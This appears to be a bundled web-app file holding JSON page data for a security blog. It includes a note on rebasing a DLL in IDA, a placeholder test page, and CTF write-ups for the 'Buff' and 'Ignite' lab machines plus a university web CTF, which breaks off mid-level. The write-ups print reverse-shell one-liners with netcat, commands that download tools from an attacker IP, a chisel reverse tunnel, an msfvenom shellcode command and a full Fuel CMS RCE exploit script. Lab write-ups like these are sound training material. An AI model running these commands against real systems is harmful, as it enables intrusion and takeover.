<strong>10001000</strong>) with the dynamic analysis one</p>","<p><img src=\\"/cyber/rundebugdll/14.jpg\\" alt=\\"\\"></p>","<p>I have to rebase the IDA window in static analysis in order to let it start from <strong>73670000</strong> instead of <strong>10001000</strong>.</p>","<p><img src=\\"/cyber/rundebugdll/15.jpg\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/rundebugdll/16.jpg\\" alt=\\"\\"></p>","<p>The rebased program address has now changed.</p>","<p><img src=\\"/cyber/rundebugdll/18.jpg\\" alt=\\"\\"></p>","<p>At this point I am stopped right after the dynamic IDA window loaded my DLL, I select any line of code and press <em>&ldquo;G&rdquo;</em> to jump in a specific address. The address where I wan to to jump is the one I found after rebasing my DLL in the stacic view of IDA which is <strong>73671000</strong> and I will jump in the desired portion of the code I want to debug.</p>","<p><img src=\\"/cyber/rundebugdll/17.JPG\\" alt=\\"\\"></p>","<p>In this way I can find by using the static view any portion of the code of the DLL, put a breakpoint, jump there and debug by executing it step by step.</p>",""]}]}]}')},906:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"test","tags":["security","reverse engineering","windows"],"date":"11/08/2024","location":"./blog/","banner":"rundebugdll/banner.webp","type":"blog","search":[{"keyword":"KeyWord1","description":"test search keyword1 in a live search react application"},{"keyword":"OnlyWord","description":"test search keyword1 in a live search react application"},{"keyword":"MoreWord1","description":"test search keyword1 in a live search react application"},{"keyword":"IdontKnowwhatword","description":"test search keyword1 in a live search react application"},{"keyword":"Key1","description":"test search keyword1 in a live search react application"},{"keyword":"Only","description":"test search keyword1 in a live search react application"},{"keyword":"Word1","description":"test search keyword1 in a live search react application"},{"keyword":"Idontword","description":"test search keyword1 in a live search react application"}],"body":[{"id":"Testing1","title":"<h1> <span style=\\"color:#da1953\\">Tes</span>ting 1</h1><hr>","body":[{"id":"Testing1.1","title":"<h2>Testing 1.1 depth</h2>","body":[{"id":"Testing1.1.1.1","title":"<h2>Testing 1.1.1 depth</h2>","body":["<p><b>this1</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test.</p>"]}]},{"id":"Testing1.2","title":"<h2>Testing 1.2 depth</h2>","body":["<p><b>this1.2</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test.</p>"]}]},{"id":"Testing2","title":"<h1> <span style=\\"color:#da1953\\">RTes</span>ting 2</h1><hr>","body":["<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>"]},{"id":"Testing3","title":"<h1> <span style=\\"color:#da1953\\">Tes</span>ting 3</h1>","body":["<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 3.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>","<p><b>this</b><p>","<p><i>is</i></p>","<p>a</p>","<p>test 2.</p>"]}]}')},155:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Buff","tags":["ctf","box","htb","web","cms","powershell","iwr","python webserver","apache 2.4.43","chisel","cloudme 1.11.2","curl","download file","nsfvenom","port forwarding","powershell iwr","windows","winpeas","Gym Manager 1.0 "],"date":"27/06/2023","location":"./writeup/","banner":"writeup/buff/banner.gif","type":"writeup","search":[{"section":"null","description":"Windows box with port 80 exposed, hosting website built with Gym Manager vulnerable to CVE giving access to the machine. Machine is vulnerable due to CLoudMe process not update."},{"section":"Exploiting Gym Manager","description":"Indentified the Gym Manager CVE with RCE - Remote Code Execution gave me a remote shell"},{"section":"Exploiting Gym Manager","description":"Downloaded NC - Netcat using the PowerShell iwr command and upgraded to a reverse shell. Alternatively, curl can also be used on this system."},{"section":"Exploiting Gym Manager","description":"Opened NC - Netcat listener to upgrade the shell"},{"section":"Search vulnerable process","description":"Searched for vulnerable process obtained with winpeas and found vulnerable CloudMe process"},{"section":"Port Forwarding","description":"Employing port forwarding with Chisel to execute CVE in Python from Kali"},{"section":"Exploitation","description":"Used nsfvenom to generate the shellcode used in the CVE to elevate the privilege (privesc)"}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Ign</span>ite</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/buff/banner.gif\\" alt=\\"\\"><hr>"]},{"id":"Scanning","title":"<hr><h2><span style=\\"color:#da1953\\">Sca</span>nning</h2>","body":["<br><pre>PORT     STATE SERVICE    VERSION<br>7680/tcp open  pando-pub?<br>8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</pre><br>"]},{"id":"Exploiting Gym Manager","title":"<h2><span style=\\"color:#da1953\\">Exp</span>loiting Gym Manager</h2>","body":["<p>The scanning reveals that there is a webserver running on port 8080 so I go to check it hoping to find some interesting information. In the page <i>contact</i>there is a information about the sofware used to build the site which is<i>Gym Manager Software 1.0</i>.</p>","<p><img src=\\"/cyber/writeup/buff/394c824c975047da8772b922fcbc9b46.png\\"></p>","<p>Searching a vulnerability or and exploit for, leads me to <a data-from-md title=\'https://www.exploit-db.com/exploits/48506\' href=\'https://www.exploit-db.com/exploits/48506\'>https://www.exploit-db.com/exploits/48506</a>. Then I donwloaded and run it as <code>python 48506.py http://10.10.10.198:8080/</code> and it ended up exploiting the software and giving me a shell. I can\'t do much with this shell, I cant change directory or do any other stuff so I need to upgrade the shell.</p>","<p>In order to do so I decided to download Netcat (nc) to the server and it includes a few steps:</p>","<ol><li>Open a web server in my Kali inside my Buff folder that I created to solve the box where I have all the exploits and programs <code>sudo python3 -m http.server 8080</code><br> <img src=\\"/cyber/writeup/buff/56bd6f9c0943430d9b1e04b84c11a092.png\\"></li><li>From the box I can connect to the Python HTTP server and download files, to do that there are two ways:<ol><li><code>powershell iwr http://10.10.14.197:8080:/nc.exe -outf nc.exe</code></li><li><code>curl http://10.10.14.197:8080/nc.exe -o nc.exe</code><br><img src=\\"/cyber/writeup/buff/a9274a65c7384c498436604953f1e81e.png\\"><br>In the directory, there are also other users artefacts.</li></ol></li></ol>","<p>Once Downloaded I open a listener on my Kali <code>nc -lvp 4444</code> and a client on the box in a way that upon connecting it will execute a command <code>nc.exe 10.10.14.197 4444 -e cmd.exe</code> it will result in having a command of the box on my kali machine.</p>","<img src=\\"/cyber/writeup/buff/bf06f1f38deb40e19379033fd6329abe.png\\"><br>"]},{"id":"User Flag","title":"<h2><span style=\\"color:#da1953\\">Use</span>r flag</h2>","body":["<p>Once got the shell I can move to the location of the user flag</p>","<img src=\\"/cyber/writeup/buff/ff20b0d447b54c38909325cbea503bca.png\\"><br>"]},{"id":"Priviledge escalation","title":"<h2><span style=\\"color:#da1953\\">Pri</span>viledge escalation</h2>","body":[{"id":"Search vulnerable process","title":"<h3>Search vulnerable process</h3>","body":["<p>To search a vulnerable process its possible to use <code>winpeas.exe</code> but in my case I checked one by one and search for them on google to see which one is vulnerable and I ended up finding <code>CloudMe.exe</code>.</p>","<p>Searching for an exploit I ended up finding many and various versions of Cloudme\u2019s version.</p>"]},{"id":"Finding CloudMe Version","title":"<h3>Finding CloudMe Version</h3>","body":["<p>While I don\'t have administrator privilege I can\'t see the version of the program with <code>tasklist</code> or <code>Get-Proces</code> so I had to look around to see if I find something. In the end, the executable was in the <code>Shaun</code> user\u2019s Download folder, which contains also the version number in the name.<br>","<img src=\\"/cyber/writeup/buff/3b6f506a74344ceabfef62b8cdacb5a5.png\\"><br>"]},{"id":"Port Forwarding","title":"<h3>Port Forwarding</h3>","body":["<p>I noticed that CloudMe runs on localhost port 8888 so there is no chance that I can remotely exploit it and neither locally because the script is in Python and it is not installed in the box. So I used <b>Chisel</b> to forward the connection. I had to donwload a precompiled version for Windows and Linux from <a data-from-md title=\'https://github.com/jpillora/chisel/releases/\' href=\'https://github.com/jpillora/chisel/releases/\'>https://github.com/jpillora/chisel/releases/</a>. I loaded Chisel in the box in the same way as Netcat. From my Kali machine, I opened a server as shown in <a data-from-md title=\'https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html\' href=\'https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html\'>https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a><br> <code>./chisel server -p 7777 --reverse</code> and a client in the box as <code>chisel client 10.10.14.187:7777 R:8888:127.0.0.1:8888</code><br>","<img src=\\"/cyber/writeup/buff/18cc7f4ffbdb4c4a97f31ff0a6bdc1f0.png\\"><br>"]},{"id":"Exploitation","title":"<h3>Exploitation</h3>","body":["<p>Now my choice of exploit comes down to four possibilities.</p>","<p><img src=\\"/cyber/writeup/buff/dce0e1743ade4d6cbee6d9b255793b64.png\\"></p>","<p>And I chose the PoC one.</p>","After opening the exploit it suggested a command line to enumerate a shellcode, so I generated a shellcode that I needed in order to exploit CloudMe and give a reverse shell. <code>msfvenom -a x86 -p windows/exec CMD=\'C:\\\\xampp\\\\htdocs\\\\gym\\\\upload\\nc.exe 10.10.14.197 1111 -e cmd.exe\' -b \'\\\\x00\\\\x0A\\\\x0D\' -f python</code> Now I have replaced the new shell code with the old one inside the script. Once exploited the CloudMe, it will invoke <b>nc.exe</b> and try to connect to my Kali machine so before that I have to listen in port 1111. And run the exploit from another shell.<br>","<p><img src=\\"/cyber/writeup/buff/9f79a8643caa4742af026633b9a6cad5.png\\"></p>","<p>The root flag in on the administrator desktop.</p>"]}]}]}]}')},456:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Ignite","tags":["ctf","box","thm","web","cms","fuelcms","apache 2.4.18","reverse shell","rce","php","cve","http 80","linux","nc","upgrade shell"],"date":"27/06/2023","location":"./writeup/","banner":"writeup/ignite/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Nmap scan to find port 80 HTTP open, revealing robots.txt and "},{"section":"Web analysis (Rabbit hole pt1)","description":"Accessing Fuel CMS admin panel revealed in robots.txt and tryin to upload files"},{"section":"RCE - Remote Code Execution","description":"Searching Fuel CMS CVE with searchsploit and found RCE - Remote Code Execution"},{"section":"Reverse shell","description":"Upgrade to a stable shell by employing a reverse shell with Netcat"},{"section":"Change shell","description":"Upgrade shell with python"},{"section":"Searching for interesting files","description":"Analyzing PHP configuration files and find credentials. Privesc - privilege escalation with the credentials"}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Ign</span>ite</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/ignite/banner.gif\\" alt=\\"\\"><hr>"]},{"id":"Scanning","title":"<hr><h2><span style=\\"color:#da1953\\">Sca</span>nning</h2>","body":["<br><pre>Nmap 7.91 scan initiated Thu Sep 16 15:42:21 2021 as: nmap -sC -sV -A -p- -oN nmap 10.10.238.237<br>Nmap scan report for ip-10-10-238-237.eu-west-1.compute.internal (10.10.238.237)<br>Host is up (0.014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>| http-robots.txt: 1 disallowed entry <br>|_/fuel/<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Welcome to FUEL CMS<br>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.91%E=4%D=9/16%OT=80%CT=1%CU=35981%PV=Y%DS=2%DC=T%G=Y%TM=614357F<br>OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS<br>OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1<br>OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN<br>OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A<br>OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R<br>OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F<br>OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%<br>OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD<br>OS:=S)</pre>","<p>The only port open is the 80 which means it has a website. I must check it!</p>"]},{"id":"Web analysis (Rabbit hole pt1)","title":"<h2><span style=\\"color:#da1953\\">Web</span> analysis (Rabbit hole pt1)</h2>","body":["<p>Once on the web page, the only thing I see is the welcome page of a default <strong>Fuel CMS</strong> welcome page.</p>","<p>At this point, I immediately went to check <em>robots.txt</em>. Why <em>robots.txt</em>?<br></p>","<ol><li>Because <em>Nmap</em> tells me about this file.<img src=\\"/cyber/writeup/ignite/37cad67d89754a1ebfd6c3705b710249.png\\"></li><li>It is a good practice to check it you never know.</li></ol>","<p>The file <em>robots.txt</em> show as follows:</p>","<pre>User-agent: *<br>Disallow: /fuel/</pre>","<p>So let me check the path. It leads to the login page of the cms.<br></p>","<img src=\\"/cyber/writeup/ignite/6599a6a905b64b6386f9fa3348d6cb6f.png\\">","<p>Since I don\'t have the credentials, the only thing I can think of to do is to try the default Fuel CMS credentials which turn out to be <code>admin:admin</code>.</p>","<p>Once logged in and taking a look around I found an upload page.<br>","<img src=\\"/cyber/writeup/ignite/777da69cd431492d8df35bdc14d859ad.png\\"></p>","<p>Now, I have tried many php reverse shell pages taken from GitHub and Pentestmonkey but none of them worked and keep giving me errors.</p>","<p><img src=\\"/cyber/writeup/ignite/438cf6338e214538ab4339d52ee67b31.png\\"></p>","<p>After some research, it seems that to fix this error I have to get my hands on the php configuration file which is not possible for me at the moment.<br><a href=\'https://stackoverflow.com/questions/45992685/php-parse-error-syntax-error-unexpected-in-helpers-php-233\'>php-parse-error-syntax-error-unexpected-in-helpers-php-233</a>.</p>","<p>I have spent quite a lot of time at this point trying to write a better reverse shell in PHP in order to upload but I think it is a <a data-from-md title=\'https:/medium.com/@luke.williams1248/on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5\' href=\'https://medium.com/@luke.williams1248on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5\'>RabbitHole</a>.</p>","<p>Then I moved on and tried another way.</p>"]},{"id":"RCE - Remote Code Execution","title":"<h2><span style=\\"color:#da1953\\">RCE</span> - Remote Code Execution</h2>","body":["<p>Now I take a step back and see what other information I have.</p>","<p>Getting back on the main Fuel CMS page I can see the version installed, so the first thing that comes to my mind is that it might have a vulnerability and an exploit.</p>","<p>So I search with <code>searchsploit fuel</code>.</p>","<pre>searchsploit fuel                  <br>-------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                        |  Path<br>-------------------------------------------------------------------------------------- ---------------------------------<br>AMD Fuel Service - \'Fuel.service\' Unquote Service Path                                | windows/local/49535.txt<br>Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                     | hardware/webapps/31180.txt<br>fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py<br>Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb<br>Fuel CMS 1.4.7 - \'col\' SQL Injection (Authenticated)                                  | php/webapps/48741.txt<br>Fuel CMS 1.4.8 - \'fuel_replace_id\' SQL Injection (Authenticated)                      | php/webapps/48778.txt<br>-------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><pre>","<p>Among all those, the one that convinces me the most is the Python RCE, called <strong>Remote Code Execution (1)</strong>.</p>","<p>To copy it I can <code>searchsploit -m 47138</code> (without the file format <em>.py</em>)</p>","<pre>\u250c\u2500\u2500(benwick\u327fbenwick)-[~]<br>\u2514\u2500$ searchsploit -m 47138<br>  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)<br>      URL: https://www.exploit-db.com/exploits/47138<br>     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py<br>File Type: Python script, ASCII text executable<br><br>Copied to: /home/kali/47138.py<br></pre>","<p>Now I have to set the exploit properly. By opening the code I can see that it is using a proxy in order to communicate with the remote target which I don\'t want so I readjust the code.</p>","<pre class=\\"python-code\\"><span class=\\"keyword\\">import</span> requests<br><span class=\\"keyword\\">import</span> urllib<br><br><span class=\\"variable\\">url</span> = <span class=\\"string\\">\\"http://10.10.81.104\\"</span><br><span class=\\"keyword\\">def</span> <span class=\\"function\\">find_nth_overlapping</span>(<span class=\\"variable\\">haystack</span>, <span class=\\"variable\\">needle</span>, <span class=\\"variable\\">n</span>):<br>    <span class=\\"variable\\">start</span> = <span class=\\"variable\\">haystack</span>.find(<span class=\\"variable\\">needle</span>)<br>    <span class=\\"keyword\\">while</span> <span class=\\"variable\\">start</span> >= 0 <span class=\\"keyword\\">and</span> <span class=\\"variable\\">n</span> > 1:<br>        <span class=\\"variable\\">start</span> = <span class=\\"variable\\">haystack</span>.find(<span class=\\"variable\\">needle</span>, <span class=\\"variable\\">start</span>+1)<br>        <span class=\\"variable\\">n</span> -= 1<br>    <span class=\\"keyword\\">return</span> <span class=\\"variable\\">start</span><br><br><span class=\\"keyword\\">while</span> 1:<br>    xxxx = raw_input(<span class=\\"string\\">\\"cmd:\\"</span>)<br>    burp0_url = <span class=\\"variable\\">url</span>+<span class=\\"string\\">\\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\\"</span>\\\\<br>+urllib.quote(<span class=\\"variable\\">xxxx</span>)+<span class=\\"string\\">\\"%27%29%2b%27\\"</span><br>    <span class=\\"comment\\">#proxy = {\\"http\\":\\"http://127.0.0.1:8080\\"}</span><br>    r = requests.get(<span class=\\"variable\\">burp0_url</span>)<span class=\\"comment\\">#, proxies=proxy)</span><br><br>    html = <span class=\\"string\\">\\"<!DOCTYPE html>\\"</span><br>    htmlcharset = r.text.find(<span class=\\"variable\\">html</span>)<br><br>    begin = r.text[0:20]<br>    dup = <span class=\\"function\\">find_nth_overlapping</span>(r.text, <span class=\\"variable\\">begin</span>, 2)<br><br>    <span class=\\"function\\">print</span> r.text[0:dup]<br></pre>","<p>Now that I have removed part of the code and set the url to the target url I am ready to execute it in order to get RCE.</p>","<p>NOTE: It is a Python script, at the time I wrote this writeup (17/09/2021) in every Linux distro python3 is the default Python and in most of them python2 is not even installed.<br>I had a few errors on running the script because I was executing the script with just <code>./47138.py</code> which uses python3 by default but this code seems working with python2 so I had to use <code>python2 47138.py</code> and managed to run it successfullyZ.</p>","<pre>\u250c\u2500\u2500(benwick\u327fbenwick)-[~]<br>\u2514\u2500$ python2 ./47138.py <br>cmd:<br></pre>","<p></p>"]},{"id":"Reverse shell","title":"<h2><span style=\\"color:#da1953\\">Rev</span>erse shell</h2>","body":["<p>The shell I got is limiting me, and can not travel the directories. It means I need a better shell so I need a reverse shell.</p>","<p>The first thing to do is to open a Netcat listener: <code>nc -lvnp 1234</code></p>","<p>I used the pentestermonkey website to get the reverse shell command which is:<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code><br>and changed the IP address with the target address.</p>","<p>NOTE: Why did I use the previous command and not the other one on the site which is shorter and easier to understand?<br><code>nc -e /bin/sh 10.0.0.1 1234</code>. This simply didn\'t work, I tried both.</p>","<p><img src=\\"/cyber/writeup/ignite/70ffe32a7e9a44ba9336716b1f3b523b.png\\"></p>"]},{"id":"User flag","title":"<h2><span style=\\"color:#da1953\\">Use</span>r flag</h2>","body":["<p>Now I can freely navigate and get the flag from the user folder.<br><img src=\\"/cyber/writeup/ignite/622d46e05de64b6cbd50c59b191e9825.png\\"></p>"]},{"id":"Rabbit hole pt2 - LinPEAS ","title":"<h2><span style=\\"color:#da1953\\">Rab</span>bit hole pt2 - LinPEAS</h2>","body":["<p>As <a href=\\"https://www.linkedin.com/in/ippsec/\\"  target=\\"blank\\" rel=\\"noopener noreferrer\\">IPPSec</a> teaches one, the best way to enumerate a machine is through linpeas (winpeas). Once downloaded and run (no details about these steps because it failed) it gave a huge report that leads nowhere.</p>"]},{"id":"Searching for interesting files","title":"<h2><span style=\\"color:#da1953\\">Sea</span>rching for interesting files</h2>","body":["<p>At this point, I started looking at the files in the <strong>/var/www/html/fuel</strong> folder.</p>","<p>Why in particular this folder? No particular reason this is the folder from where I started and need to check the whole box so eventually I will check this. I am lucky because the solution for the next step is here.</p>","<p>By navigating inside the folder at a certain point I reached the file <strong>/var/www/html/fuel/application/config/database.php</strong> which contains the password for the administrator account.</p>","<p>To view the file I can just <code>cat database.php</code></p>","<p><img src=\\"/cyber/writeup/ignite/815d893c60c049aa83450ce0bca3e3da.png\\"></p>"]},{"id":"Change shell","title":"<h2><span style=\\"color:#da1953\\">Cha</span>nge shell</h2>","body":["<p>Sometimes happens that simpli using the <code>cat</code> command doesn\'t work and it says: <i>Command : must be run from a terminal</i>. In order to have a better shell I can run the following command:<code>python -c \'import pty; pty.spawn(&quot;/bin/bash&quot;)\'</code></p>","<p><img src=\\"/cyber/writeup/ignite/0364d820431744c1a5604b168e6c7eac.png\\"></p>"]},{"id":"Root flag","title":"<h2><span style=\\"color:#da1953\\">Roo</span>t flag</h2>","body":["<p>Finally, to get the root flag I have to elevate the privilege. While I have the username and the password I can simply switch the user <code>su root</code> and enter the password to become root and read the root flag.</p>","<p><img src=\\"/cyber/writeup/ignite/1a5ee7c350e04dfb873ad7f82f23537e.png\\"></p>"]}]}]}')},110:e=>{"use strict";e.exports=JSON.parse('{"files":["writeupdb/buff.json","writeupdb/ignite.json","writeupdb/uni-ctf.json"],"next":["writeupdb/ignite.json"]}')},50:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"University CTF","tags":["ctf","web","security","sqli","shellshock","http header","code injection","brute force","rot13"],"date":"27/06/2023","location":"./writeup/","banner":"writeup/unictf/banner.webp","type":"writeup","search":[{"section":"Level 1 - Password validation","description":"Inspected the source code to find the password validation function to retrieve hard-coded credentials"},{"section":"Level 2 - Stop!","description":"Inspected the source to find the password in the alt value of the image"},{"section":"Level 3 - Password verification","description":"Inspected the source code and enabled the hidden input to become administrator"},{"section":"Level 4 - Secure Browser","description":"Impersonated a different browser by changing the \\"user-agent\\" and \\"referrer\\" headers"},{"section":"Level 5 - Headers","description":"Changed the \\"referrer\\" header to get the flag"},{"section":"Level 6 - Your personal secret","description":"Changed to \\"uid\\" parameter in the URL to find the admin page and the flag"},{"section":"Level 7 - Password protected","description":"Guessed login credentials by using teacher\'s email as username"},{"section":"Level 8 - Your persona secret pt.2","description":"Used ROT13 to decrypt the \\"user\\" parameter in the URL and encrypt the \\"admin\\" value to access the admin page"},{"section":"Level 9 - Password protected pt.2","description":"Inspected the source code to find in a comment the file \\"session.txt\\" containing the active admin session. Updated the current cookie session to access as admin"},{"section":"Level 10 - Bytestream","description":"Inspected the source code and found the MD5 hash of the password and decrypted it to access as admin"},{"section":"Level 11 - Brutus system","description":"Inspected the source code and found the password check function. Reverse engineered the function logic and implemented a Python function to decrypt the password"},{"section":"Level 12 - PHP","description":"Inspected the code and found the PHP filter vulnerable to bash injection, bypasses the restriction, obtained RCE - remote code execution to retrieve the flag"},{"section":"Level 13 - Bash Environment","description":"Exploited shellshock vulnerability to bypass the PHP filter and obtain RCE - remote code execution to retrieve the flag"},{"section":"Level 14 - SQL Injection","description":"Employed manual SQL Injection to exfiltrate admin credentials"}],"body":[{"id":"University web CTF","title":"<h1> <span style=\\"color:#da1953\\">Uni</span>versity web CTF </h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/unictf/banner.webp\\" alt=\\"\\"><hr>"]},{"id":"Introduction","title":"<hr><h2> <span style=\\"color:#da1953\\">Int</span>roduction </h2>","body":["<p>This was my university CTF during my Masters\' degree in Cybersecurity, we compeeted in team and I was paired with one of my university colleague and friend and we completed all the challenges. At that time I was at the start of my journe in the Cybersecurity field, even if now theese challenges seels really easy at during that period was enlighting and they tought me many things about web and web security.</p>","<p>This writeup is written in a way to show not only the solution but also my process and my thinking behind and action. I believe that learning skills is relatively easy thanks to various resources available for free but the hardest part is to have the right mindset to approach the challenges.</p>","<hr>"]},{"id":"Level 1 - Password validation","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 1 - Password validation </h2>","body":["<p>The URL of the first level was given as the starting point:</p>","<p><code>http://eth-lab.di.uniroma1.it:55001/eishohwohpahxooy/</code></p>","<p>As stated during the Web Security Challenges lectures, the first thing to do when trying to hack a web page was to actually use the web page as it was supposed to be used. So, in other words, you simply do what the web page asks you to do.</p>","<p>Therefore, we first tried to log in by inserting a random username and password, as requested from the web page itself.</p>","<p><img src=\\"/cyber/writeup/unictf/image18.png\\" alt=\\"\\"></p>","<p>As we expected we received an error:</p>","<p><img src=\\"/cyber/writeup/unictf/image28.png\\" alt=\\"\\"></p>","<p>Then, we tried to dig further inspecting the web page&rsquo;s source code.</p>","<p><img src=\\"/cyber/writeup/unictf/image63.png\\" alt=\\"\\"></p>","<p>We observed  in the form above that on clicking Submit we actually call a function named <em>verify</em>.</p>","<p>So, we started looking for a function called verify in the Console section (right click - inspect element).</p>","<p><img src=\\"/cyber/writeup/unictf/image43.png\\" alt=\\"\\"></p>","<p>As seen from the picture above, we found the function Verify. Now jumping into the definition of the function, to check in detail what was the Verify function supposed to do.</p>","<p><img src=\\"/cyber/writeup/unictf/image64.png\\" alt=\\"\\"></p>","<p>I was in plaintext in the <code>if</code> condition highlighted in red, the password and the username needed in order to access the web page.</p>","<p><img src=\\"/cyber/writeup/unictf/image86.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 2 - Stop!","title":"<h2 id=LV2> <span style=\\"color:#da1953\\">Lev</span>el 2 - Stop!</h2>","body":["<p>Once solved the Level 1, the URL of the second level was found:</p>","<p><code>http://eth-lab.di.uniroma1.it:55043/zeitaeveishiidef</code></p>","<p>This was how the Level 2 looked like:</p>","<p><img src=\\"/cyber/writeup/unictf/image67.png\\" alt=\\"\\"></p>","<p>In this level there was only the possibility to insert a password, there was no username. So, let&rsquo;s try to insert a random password.</p>","<p><img src=\\"/cyber/writeup/unictf/image72.png\\" alt=\\"\\"></p>","<p>Well, wrong password! As done in the previous level, we tried to look further by analyzing the source code.</p>","<p><img src=\\"/cyber/writeup/unictf/image70.png\\" alt=\\"\\"></p>","<p>Reading the first lines we could clearly see that there was a function implementation, the function seems to encrypt the text inserted in the password field, with MD5 function. The first idea was to decrypt what seems to be a ciphertext in the <code>if</code> condition.</p>","<p>After using numerous MD5 online decrypters without success, we decide to keep on reading the source code. While having a closer look at it, we noticed two images references in the inspector section: one was a reference to the picture in the home page &ldquo;kitten.jpg&rdquo; and the other one was a picture with a hidden parameter &ldquo;srct.png&rdquo;.</p>","<p>Putting the cursor on top of the reference <em>scrt.png</em> a window popped up with a text.</p>","<p><img src=\\"/cyber/writeup/unictf/image77.png\\" alt=\\"\\"></p>","<p>The text on the picture was the right password to insert in order to solve the level.</p>","<hr>"]},{"id":"Level 3 - Password verification","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 3 - Password verification</h2>","body":["<p>As usual, in the previous level, we found the link to access the next one:</p>","<p><code>http://eth-lab.di.uniroma1.it:55208/bahjeighahveerae/cgi-bin/index.php</code></p>","<p>As tried before, as a first step when trying to relate to a new web page, we tried to follow the natural instructions of the web page itself, this time trying to insert a username and password. We decided to try with some random and basic combination of username and password (e.g. <em>admin:admin</em>).</p>","<p>As we expected, we received the following error message:</p>","<p><img src=\\"/cyber/writeup/unictf/image73.png\\" alt=\\"\\"></p>","<p>So, we analyzed the source code once 